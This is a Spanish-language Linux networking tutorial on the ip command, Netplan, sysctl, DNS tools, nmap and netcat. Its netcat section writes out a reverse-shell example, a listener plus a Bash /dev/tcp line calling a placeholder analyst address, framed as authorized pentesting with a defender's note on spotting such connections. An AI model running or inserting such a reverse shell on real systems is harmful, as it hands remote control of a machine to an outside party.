# Configuración de red

## Índice

1. [Configuración de red de forma no persistente](#1-configuración-de-red-de-forma-no-persistente)
   1. [Gestión de parámetros de enlace](#11-gestión-de-parámetros-de-enlace)
   2. [Gestión de tabla ARP (capa de enlace)](#12-gestión-de-tabla-arp-capa-de-enlace)
   3. [Gestión de direcciones IP (capa de red)](#13-gestión-de-direcciones-ip-capa-de-red)
   4. [Configuración de rutas (capa de red)](#14-configuración-de-rutas-capa-de-red)
   5. [Fichero `/etc/hosts`](#15-fichero-etchosts)
2. [Configuración de red de forma persistente](#2-configuración-de-red-de-forma-persistente)
   1. [Uso de `/etc/network/interfaces` (sistema Debian)](#21-uso-de-etcnetworkinterfaces-sistema-debian)
   2. [Netplan (Ubuntu > 20.04)](#22-netplan-ubuntu--2004)
3. [Otros parámetros relevantes de la red](#3-otros-parámetros-relevantes-de-la-red)
   1. [Reenvío IP](#31-reenvío-ip)
   2. [Desactivar la respuesta de paquetes ICMP](#32-desactivar-la-respuesta-de-paquetes-icmp)
4. [Herramientas de utilidad de red](#4-herramientas-de-utilidad-de-red)
   1. [ping](#41-ping)
   2. [Netcat](#42-netcat)
   3. [nmcli](#43-nmcli)
   4. [hostnamectl](#44-hostnamectl)
   5. [Configurar el cliente de DNS](#45-configurar-el-cliente-de-dns)
   6. [Comando dig](#46-comando-dig)
   7. [Comando host](#47-comando-host)
   8. [Comando getent](#48-comando-getent)
   9. [Comando nmap](#49-comando-nmap)
5. [Configuración de proxy en Debian](#5-configuración-de-proxy-en-debian)

---

## 1. Configuración de red de forma no persistente

Hasta la primera década del siglo XXI, los comandos `ifconfig` y `route` se utilizaban para realizar configuraciones de red. En **GNU/Linux** (Debian/Ubuntu), estas utilidades se distribuían dentro del paquete `net-tools`, el cual fue declarado obsoleto en 2011. Actualmente, se recomienda la migración al estándar **iproute2**. 

Todas las utilidades de configuración incluidas en `net-tools` se han unificado en **iproute2** bajo el comando `ip`.

> **Nota:** Al usar el comando `ip`, no es necesario escribir completamente sus argumentos. Solo hace falta escribir la parte mínima para desambiguar. Por ejemplo, `ip address show` se puede resumir en `ip a s`. Si el último parámetro es `show`, se puede omitir (ej. `ip a`).

### 1.1 Gestión de parámetros de enlace

La gestión de parámetros de la capa de enlace se hace con el comando `ip link`. Esto permite consultar los parámetros de enlace, cambiar el estado (`up`/`down`), el nombre de la interfaz, el MTU o la dirección MAC.

| Comando `ip link` | Definición |
|-------------------|------------|
| `ip link show` | Permite ver los datos de la interfaz relativos a la capa de enlace. |
| `ip link set enp0s8 down` | Desactiva la interfaz especificada (usar `up` para activarla). |
| `ip link set enp0s8 name eth2` | Renombra la interfaz `enp0s8` a `eth2`. No se permite cambiar si la interfaz está activa. |
| `ip link set enp0s8 address 02:01...` | Cambia la dirección MAC. La interfaz debe estar apagada. |
| `ip link set enp0s8 mtu 1200` | Cambia el MTU (tamaño máximo de trama). Por defecto en Ethernet es 1500. |
| `ip link set enp0s8 multicast off`| Desactiva el tráfico multicast. (Usar `on` para activar). |
| `ip link set enp0s8 txqueuelen 2000`| Establece el tamaño de la cola de envío de tramas a 2000. |
| `ip link set dev enp0s8 promisc on`| Activa el modo promiscuo para interceptar todo el tráfico que llegue al adaptador de red. |

### 1.2 Gestión de tabla ARP (capa de enlace)

El protocolo **ARP (Address Resolution Protocol)** permite obtener direcciones MAC de otros equipos del mismo segmento de red dada su dirección IP. Se emplea una caché llamada **tabla ARP** para almacenar asociaciones de IP-MAC temporalmente.

El manejo de la tabla ARP se realiza con el comando `ip neighbour`.

| Comando `ip neighbour` | Definición |
|------------------------|------------|
| `ip neighbour show` | Muestra la tabla de ARP (vecinos) del equipo. |
| `ip neighbour flush dev enp0s8` | Borra todas las entradas ARP asociadas a la interfaz `enp0s8`. |
| `ip neighbour del lladdr MAC to IP dev...`| Borra una entrada ARP específica (MAC e IP). |
| `ip neighbour add IP lladdr MAC dev...` | Añade manualmente una entrada ARP permanente a la tabla. |

### 1.3 Gestión de direcciones IP (capa de red)

La gestión se hace con `ip address`. Cada dispositivo debe tener al menos una dirección de red. 

| Comando `ip address` | Definición |
|----------------------|------------|
| `ip address show dev enp0s8` | Muestra las direcciones IP de `enp0s8`. |
| `ip address flush dev enp0s8` | Elimina todas las direcciones IP de la interfaz. |
| `ip address add IP/MASCARA dev enp0s8` | Añade una dirección IP a la interfaz especificada. |
| `ip address del IP/MASCARA dev enp0s8` | Elimina una dirección IP de la interfaz. |

> **Nota:** Al configurar una dirección IP, Linux añade automáticamente la ruta directa hacia la red asociada a esa IP.

### 1.4 Configuración de rutas (capa de red)

La gestión de rutas (estáticas) se hace con el comando `ip route`.

| Comando `ip route` | Definición |
|--------------------|------------|
| `ip route show` | Muestra la tabla de enrutamiento actual. |
| `ip route add RED/MASCARA dev enp0s8` | Añade una ruta directa hacia la red a través del dispositivo especificado. |
| `ip route del RED/MASCARA` | Borra la entrada correspondiente de la tabla de rutas. |
| `ip route add RED/MASCARA via IP_GW` | Añade una ruta que pasa a través de una puerta de enlace (`gateway`). |
| `ip route add default via IP_GW` | Añade la ruta por defecto (`default gateway`). |
| `ip route del default` | Borra la ruta por defecto. |

### 1.5 Fichero `/etc/hosts`

El fichero `/etc/hosts` es un archivo de texto plano que asocia nombres legibles con direcciones IP. Funciona como un solucionador DNS local y se consulta antes de enviar peticiones a servidores DNS externos.

```bash
# Ejemplo de /etc/hosts
127.0.0.1       localhost
127.0.1.1       usuario

# Servidores
192.168.1.10    servidor.local
```

---

## 2. Configuración de red de forma persistente

Para hacer permanente la configuración, se puede usar:
- **NetworkManager**: Usado mayormente en distribuciones de escritorio.
- **Netplan** (`/etc/netplan/*`): Introducido en Ubuntu 20.04.
- **ifupdown/interfaces** (`/etc/network/interfaces`): Tradicional en Debian y servidores clásicos.

### 2.1 Uso de `/etc/network/interfaces` (sistema Debian)

```bash
# Configuración DHCP (IPv4 e IPv6)
auto enp0s8
allow-hotplug enp0s8
iface enp0s8 inet dhcp
iface enp0s8 inet6 dhcp

# Configuración estática (IPv4)
auto enp0s8
allow-hotplug enp0s8
iface enp0s8 inet static
    address 192.168.2.7
    netmask 255.255.255.0
    gateway 192.168.2.1
```

> **Nota:** La directiva `auto` hace que la interfaz se levante durante el arranque del sistema, mientras que `allow-hotplug` la levanta cuando el núcleo detecta que se conecta el dispositivo. En un servidor con la tarjeta siempre presente basta con `auto`; ambas pueden convivir sin problema.

> **Nota:** El fichero principal es `/etc/network/interfaces`, pero conviene fijarse en que suele terminar con la línea `source /etc/network/interfaces.d/*`. Gracias a ella se puede añadir cada interfaz en un fichero separado dentro del directorio `interfaces.d/`, lo que resulta más ordenado que acumularlo todo en un único archivo.

> **Nota:** Tras editar la configuración, los cambios no se aplican solos. Hay que reiniciar el servicio con `systemctl restart networking`, o levantar y bajar la interfaz concreta con `ifup enp0s8` e `ifdown enp0s8`.

> **Aviso:** Cuando se emplea este archivo, es necesario configurar los servidores DNS manualmente en el fichero `/etc/resolv.conf`.

> **Advertencia:** En un sistema donde `NetworkManager` gestione la red, no deben mezclarse ambos métodos: una interfaz declarada en `/etc/network/interfaces` queda fuera del control de `NetworkManager`, y configurar la misma tarjeta por los dos sitios provoca conflictos. Conviene decidir un único gestor de red por máquina.

### 2.2 Netplan (Ubuntu > 20.04)

Netplan utiliza YAML para configurar la red y reside en `/etc/netplan/`.

```yaml
# Ejemplo: /etc/netplan/01-netcfg.yaml
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: true
    enp0s8:
      dhcp4: no
      addresses:
        - 192.168.121.221/24
      routes:
        - to: default
          via: 192.168.121.1
      nameservers:
        addresses:
          - 8.8.8.8
          - 1.1.1.1
```

Para validar y aplicar los cambios:

```bash
sudo netplan try
sudo netplan apply
```

---

## 3. Otros parámetros relevantes de la red

### 3.1 Reenvío IP

Por defecto, Linux funciona como `workstation` (descarta paquetes si la IP destino no es la suya). Para que actúe como router, se debe activar el **Reenvío IP** (`IP Forwarding`).

Se puede activar de forma temporal de tres maneras equivalentes, ya que `sysctl` no es más que una interfaz cómoda sobre los ficheros de `/proc/sys/`:

```bash
root@debian:~# sysctl -w net.ipv4.ip_forward=1
root@debian:~# echo 1 > /proc/sys/net/ipv4/ip_forward
```

> **Importante:** Cualquiera de las dos órdenes surte efecto al instante pero **se pierde al reiniciar**. Para que el cambio sea permanente hay que escribirlo en `/etc/sysctl.conf`, o mejor en un fichero propio dentro de `/etc/sysctl.d/`, y recargarlo con `sysctl -p`:
>
> ```bash
> root@debian:~# echo 'net.ipv4.ip_forward = 1' > /etc/sysctl.d/99-router.conf
> root@debian:~# sysctl -p /etc/sysctl.d/99-router.conf
> net.ipv4.ip_forward = 1
> ```

### 3.2 Desactivar la respuesta de paquetes ICMP

Para evitar que el servidor responda a peticiones PING (`echo request`), se ajusta el parámetro `icmp_echo_ignore_all`, de forma temporal con `sysctl -w` o persistente en `/etc/sysctl.conf`:

```bash
# Temporal, hasta el próximo reinicio
root@debian:~# sysctl -w net.ipv4.icmp_echo_ignore_all=1

# Persistente, añadido a /etc/sysctl.conf
net.ipv4.icmp_echo_ignore_all = 1
```

> **Advertencia:** El bloque de configuración persistente debe contener **únicamente** los parámetros que se desean cambiar. Mezclar aquí `net.ipv4.ip_forward = 1`, como es fácil hacer copiando del apartado anterior, convertiría el equipo en un router de forma permanente sin pretenderlo. Cada directiva de `sysctl` es independiente y no guarda relación con las demás.

> **Nota:** Dejar de responder al PING no oculta la máquina en la red: un escaneo de puertos con `nmap` la seguirá detectando en cuanto encuentre un puerto abierto. Es una medida de ruido de fondo, no de seguridad real.

---

## 4. Herramientas de utilidad de red

### 4.1 ping

Verifica conectividad ICMP con otro host.

```bash
# -c: Número de ecos a emitir
# -I: Interfaz específica
# -b: Envío a IP de broadcast
ping -c 1 10.9.238.170
ping -I eth0 192.168.1.60
```

### 4.2 Netcat

`nc` es la "navaja suiza" de las redes. Permite abrir puertos, crear clientes TCP/UDP y comprobar si un puerto remoto está abierto.

> **Advertencia:** Existen varias implementaciones de `netcat` con sintaxis incompatibles. La que trae Debian por defecto es la de **OpenBSD** (`netcat-openbsd`), en la que la opción `-p` **no** se usa junto a `-l`: el puerto de escucha se indica directamente como argumento. Así, `nc -l -p 8080` es la sintaxis de la versión *traditional* y en OpenBSD se escribe `nc -l 8080`. Para saber cuál hay instalada, `readlink -f $(which nc)`.

| Comando (OpenBSD) | Descripción |
|---|---|
| `nc -l 8080` | Pone la máquina a escuchar en el puerto TCP 8080. |
| `nc -zv localhost 22` | Comprueba si el puerto 22 está abierto sin enviar datos (`-z`). |
| `nc -zv 192.168.1.10 20-25` | Comprueba un rango de puertos. |
| `nc -u ...` | Emplea UDP en lugar de TCP. |

**Ejemplo de chat simple:**

```bash
# Servidor (OpenBSD netcat)
nc -l 2000

# Cliente
nc 192.168.112.1 2000
```

También sirve para transferir un fichero entre dos máquinas sin necesidad de un servicio dedicado:

```bash
# Receptor
nc -l 2000 > copia.tar.gz

# Emisor
nc 192.168.112.1 2000 < original.tar.gz
```

> **Nota (contexto de seguridad):** En auditorías y ejercicios de *pentesting* autorizados, `netcat` se emplea para establecer una *reverse shell*: la máquina comprometida inicia la conexión **hacia** el analista, en lugar de esperar a que este se conecte. Esta dirección de conexión es la habitual porque suele sortear los cortafuegos, que filtran el tráfico entrante pero no el saliente.

```bash
# 1. El equipo del analista escucha en el puerto 1331
nc -lvnp 1331

# 2. El equipo remoto abre una shell hacia el analista
/bin/bash -i >& /dev/tcp/198.51.100.250/1331 0>&1
```

> **Advertencia:** El segundo comando **no usa `netcat`**: aprovecha el fichero virtual `/dev/tcp/host/puerto`, una función propia de Bash tratada en el documento 10, que abre una conexión de red al leer o escribir en él. Por eso funciona incluso en sistemas donde `netcat` no está instalado. Comprender este mecanismo es tan útil para el que defiende una red como para el que la audita: detectar una conexión saliente inesperada hacia un puerto poco habitual es una de las señales de compromiso más claras.

### 4.3 nmcli

Herramienta CLI para interactuar con **NetworkManager**.

*   Permite gestionar interfaces, configurar IPs (DHCP/Estática), conexiones WiFi o VPN y rutas. Muy útil para scripts automatizados.

### 4.4 hostnamectl

Muestra y permite configurar el nombre del equipo, administrado por `systemd`.

```bash
root@debian:~# hostnamectl set-hostname servidor.curso.local
root@debian:~# hostnamectl
 Static hostname: servidor.curso.local
       Icon name: computer-vm
         Chassis: vm
```

> **Nota:** `hostnamectl set-hostname` aplica el cambio de inmediato y lo hace persistente escribiéndolo en `/etc/hostname`; no hace falta reiniciar ningún servicio. El *prompt* de la terminal actual, en cambio, no se actualiza hasta abrir una sesión nueva, porque se calculó al iniciarla.

> **Recuerda:** Cambiar el *hostname* no basta para que la máquina se reconozca a sí misma por ese nombre. Conviene añadir también la línea correspondiente en `/etc/hosts` asociándolo a `127.0.1.1`, tal como hace el instalador de Debian. De lo contrario, algunos programas tardan en arrancar mientras intentan resolver sin éxito el nombre del propio equipo.

### 4.5 Configurar el cliente de DNS

Edición manual de `/etc/resolv.conf`:

```bash
nameserver 8.8.8.8
nameserver 8.8.4.4
domain curso.local
search localdomain curso.local
```

> **Advertencia:** En la mayoría de sistemas actuales, `/etc/resolv.conf` **lo genera automáticamente** otro servicio (`NetworkManager`, `systemd-resolved` o `resolvconf`), de modo que cualquier cambio escrito a mano se **pierde** en la siguiente renovación de DHCP o reinicio de la red. Una pista de que es así es que el propio fichero suele empezar con un comentario de aviso, o ser un enlace simbólico:
>
> ```bash
> usuario@debian:~$ ls -l /etc/resolv.conf
> lrwxrwxrwx 1 root root 39 sep 18 08:12 /etc/resolv.conf -> ../run/systemd/resolve/stub-resolv.conf
> ```
>
> En ese caso, los servidores DNS se configuran en el gestor correspondiente: con la directiva `dns-nameservers` en `/etc/network/interfaces`, en la sección `nameservers` de Netplan, o mediante `nmcli`.

### 4.6 Comando dig

Consulta avanzada a servidores DNS para extraer registros (A, MX, TXT, etc.).

```bash
dig a +short www.aibench.org
```

### 4.7 Comando host

Alternativa simplificada a `dig` para resolución DNS rápida.

```bash
host tele2.es
```

### 4.8 Comando getent

Consulta bases de datos del sistema controladas por NSS (Name Service Switch) en `/etc/nsswitch.conf`. 

```bash
getent passwd operador   # Extrae la línea de /etc/passwd
getent group             # Extrae los grupos
getent hosts google.com  # Resuelve el nombre usando el mismo camino que las aplicaciones
```

> **Importante:** El valor de `getent hosts` frente a `dig` o `host` es que sigue **exactamente el mismo camino de resolución que usan las aplicaciones normales**, definido en `/etc/nsswitch.conf`. Eso incluye `/etc/hosts`, el DNS y cualquier otra fuente configurada, en el orden establecido. Por eso, si un programa resuelve un nombre de forma distinta a lo que devuelve `dig`, la respuesta suele estar en `getent`: probablemente exista una entrada en `/etc/hosts` que `dig`, que consulta el DNS directamente, no llega a ver.

### 4.9 Comando nmap

Herramienta avanzada de escaneo de puertos, detección de versiones y OS.

```bash
apt install nmap -y
nmap -v -A 192.168.1.125
```

> **Nota:** La opción `-A` activa detección de SO, versiones de servicios, scripts de reconocimiento (NSE) y traceroute. La opción `-v` aumenta la verbosidad de salida.

---

## 5. Configuración de proxy en Debian

Para configurar un proxy global en el sistema se pueden declarar variables de entorno en un archivo dedicado, como `/etc/profile.d/proxy.sh`.

```bash
# http/https
export http_proxy="http://xx.xx.xx.xx:yyyy/"
export https_proxy="http://xx.xx.xx.xx:yyyy/"

# curl
export HTTP_PROXY="http://xx.xx.xx.xx:yyyy/"
export HTTPS_PROXY="http://xx.xx.xx.xx:yyyy/"
```

Luego se aplican las variables con `source`:

```bash
source /etc/profile.d/proxy.sh
```

> **Nota:** Para que las aplicaciones ejecutadas con `sudo` conserven estas variables, se debe añadir al archivo `/etc/sudoers`:
> ```bash
> Defaults        env_keep += "http_proxy https_proxy HTTP_PROXY HTTPS_PROXY"
> ```
